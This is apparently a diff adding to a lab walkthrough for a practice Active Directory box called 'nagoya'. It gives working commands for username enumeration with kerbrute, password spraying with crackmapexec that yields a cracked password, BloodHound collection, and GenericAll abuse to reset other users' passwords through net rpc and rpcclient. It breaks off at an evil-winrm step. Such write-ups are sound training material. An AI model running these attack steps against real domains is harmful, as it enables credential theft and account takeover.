@@ -133,3 +133,95 @@ and use thos command (for more, please read github page):
 Our result:
 
 ![usernames](image-1.png)
+
+Lets check with kerbrute, which usernames are valid:
+```bash
+./kerbrute_linux_amd64 userenum --dc nagoya.pgp -d nagoya-industries.com user.names 
+```
+
+![Valid usernames](image-2.png)
+
+Now clean this up and we have list:
+```bash
+matthew.harrison
+emma.miah
+rebecca.bell
+scott.gardner
+terry.edwards
+holly.matthews
+anne.jenkins
+brett.naylor
+melissa.mitchell
+craig.carr
+fiona.clark
+patrick.martin
+kate.watson
+kirsty.norris
+andrea.hayes
+abigail.hughes
+melanie.watson
+frances.ward
+sylvia.king
+wayne.hartley
+iain.white
+joanna.wood
+bethan.webster
+elaine.brady
+christopher.lewis
+megan.johnson
+damien.chapman
+joanne.lewis
+```
+
+lets try to find password for them:
+```bash
+crackmapexec smb nagoya.pgp -u usernames -p /usr/share/seclists/Passwords/corporate_passwords.txt 
+```
+
+And we have it!
+
+```bash
+fiona.clark:Summer2023
+```
+
+Let's check what she can do with bloodhound:
+```bash
+bloodhound-python -u "fiona.clark" -p 'Summer2023' -d nagoya-industries.com -c all --zip -ns 192.168.237.21
+```
+
+![Bloodhound ss](image-3.png)
+
+Fiona is member of employee group with GenericAll entitlments, as per https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html?highlight=GenericAll#genericall-rights-on-user:
+
+"This privilege grants an attacker full control over a target user account. Once GenericAll rights are confirmed using the Get-ObjectAcl command, an attacker can:
+
+Change the Target's Password: Using net user <username> <password> /domain, the attacker can reset the user's password.
+From Linux, you can do the same over SAMR with Samba net rpc:
+bash
+# Reset target user's password over SAMR from Linux
+net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>" and some more...
+So lets do it!
+
+```bash
+ net rpc password joanna.wood 'Password@' -U nagoya-industries.com/fiona.clark%'Summer2023' -S 192.168.237.21
+
+or
+
+rpcclient -U "fiona.clark%Summer2023" nagoya.pgp
+rpcclient $> setuserinfo2 joanna.wood 23 Password@
+```
+
+Joanna is member of helpdesk, and has Genric all for all employees:
+
+![Bloodhound2 ss](image-4.png)
+
+Last one, Christopher Lewis is member or 5 groups instead of 3 like rest of employees. One of this group is remote managment user which is great for us:
+
+![Bloodhound3 ss](image-5.png)
+
+So now, lest do teh same and change password for chris.
+```bash
+ net rpc password christopher.lewis 'Password@' -U nagoya-industries.com/joanna.wood%'Password@' -S 192.168.237.21
+ ```
+
+ Now evilwinrm
